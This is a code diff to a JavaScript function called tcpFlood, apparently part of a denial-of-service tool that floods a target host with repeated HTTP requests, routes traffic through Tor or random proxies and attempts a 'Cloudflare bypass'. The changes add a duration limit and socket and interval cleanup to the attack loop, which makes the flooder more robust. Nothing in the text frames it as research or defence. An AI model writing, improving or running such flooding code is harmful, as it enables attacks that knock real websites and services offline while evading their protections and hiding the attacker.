@@ -115,11 +115,11 @@ async function tcpFlood(threadId) {
 
     log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${resetColor}`);
 
-    while (isRunning) {
+    while (isRunning && duration > 0) {
+        let socket = null;
         try {
             const connect = () => {
                 return new Promise((resolve, reject) => {
-                    let socket;
 
                     if (isTor && onionSupport) {
                         const options = {
@@ -146,7 +146,7 @@ async function tcpFlood(threadId) {
                             resolve(sock);
                         });
                     } else if (proxies.length > 0 && cloudflareBypass) {
-                        // Use a proxy from the list for Cloudflare bypass
+                         // Use a proxy from the list for Cloudflare bypass
                         const proxyString = getRandomProxy();
                         if (!proxyString) {
                             log(`${darkRed}[THREAD ${threadId}] No proxies available${resetColor}`);
@@ -205,7 +205,8 @@ async function tcpFlood(threadId) {
 
                         req.end();
                         resolve(req);
-                    } else {
+                    }
+                     else {
                         if (isHTTPS) {
                             // TLS/SSL connection
                             const tlsOptions = {
@@ -233,7 +234,7 @@ async function tcpFlood(threadId) {
                 });
             };
 
-            const socket = await connect();
+            socket = await connect();
 
             let intervalId = setInterval(() => {
                 let payload = "GET / HTTP/1.1\r\n";
@@ -274,14 +275,25 @@ async function tcpFlood(threadId) {
             socket.on('error', (err) => {
                 log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                 socket.destroy();
+                clearInterval(intervalId); // Clear interval on socket error
             });
 
             socket.on('close', () => {
                 log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
+                clearInterval(intervalId); // Clear interval on socket close
             });
 
         } catch (connectError) {
             log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
+            if(socket){
+                socket.destroy();
+            }
+        } finally {
+            // Decrement duration even if there was an error
+            duration--;
+            if(duration <= 0){
+               isRunning = false; // Stop the attack
+            }
         }
     }
 
